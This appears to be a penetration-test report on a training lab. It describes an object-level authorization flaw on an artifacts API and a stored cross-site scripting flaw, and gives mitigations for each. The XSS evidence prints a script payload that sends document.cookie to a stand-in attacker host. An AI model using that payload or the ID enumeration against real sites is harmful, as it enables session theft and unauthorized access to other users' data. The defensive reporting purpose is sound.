Security Assessment Report

## Environment
- Target: Authorized Vulnerable Training Lab
- Assessment Type: Web Application Security Assessment
- Date: September 2026

---

## Finding 1: Broken Object Level Authorization (BOLA)

**Affected Component:** `/api/v2/jobs/artifacts/<artifact_id>`

**Risk Level:** High

### Description
The endpoint fails to validate whether the authenticated user owns the requested artifact. An attacker can enumerate `artifact_id` values (Insecure Direct Object Reference) and access sensitive build logs or proprietary source code belonging to other users.

### Evidence

Request:

```http
GET /api/v2/jobs/artifacts/99912 HTTP/1.1
Host: target-lab.local
Authorization: Bearer <Attacker_Token>
```

Response:

```json
{
  "artifact_id": 99912,
  "owner": "victim_user",
  "data": "secret_source_code..."
}
```

### Impact
- Unauthorized access to confidential information
- Exposure of source code and build artifacts
- Potential data leakage between tenants

### Recommended Mitigation
- Enforce authorization checks on every request.
- Verify ownership before returning artifact data.
- Apply role-based access controls.
- Log and monitor unauthorized access attempts.

---

## Finding 2: Stored Cross-Site Scripting (XSS)

**Affected Component:** `/profile/comments`

**Risk Level:** Medium

### Description
User input submitted through the comment section is stored without proper sanitization. When another user views the affected profile, the malicious script executes in the victim's browser.

### Evidence

Submitted payload:

```html
<script>
fetch('http://attacker.local' + document.cookie)
</script>
```

### Impact
- Session theft
- Account compromise
- Unauthorized actions performed as the victim user
- Defacement of application content

### Recommended Mitigation
- Apply context-aware output encoding.
- Sanitize user-supplied input before storage and rendering.
- Implement a strong Content Security Policy (CSP).
- Validate and filter dangerous HTML and JavaScript content.

---

## Conclusion

The assessment identified two significant security weaknesses within the training environment:

1. Broken Object Level Authorization (High Risk)
2. Stored Cross-Site Scripting (Medium Risk)

Immediate remediation is recommended, particularly for the BOLA vulnerability due to its potential impact on confidentiality and tenant isolation.
